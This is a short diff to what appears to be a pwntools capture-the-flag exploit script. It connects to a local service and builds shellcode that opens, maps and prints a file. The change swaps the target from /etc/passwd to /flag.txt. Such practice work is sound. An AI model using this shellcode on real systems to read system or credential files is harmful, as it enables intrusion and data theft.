@@ -39,7 +39,8 @@ continue
 # PIE:      PIE enabled
 
 io = start()
-payload = shellcraft.open("/etc/passwd")
+io = connect("localhost", 1348)
+payload = shellcraft.open("/flag.txt")
 payload += shellcraft.mmap(0x1337000, 0x1000, constants.linux.PROT_READ, constants.linux.MAP_PRIVATE, "rax", 0)
 payload += shellcraft.write(1, 0x1337000, 0x1000)
 
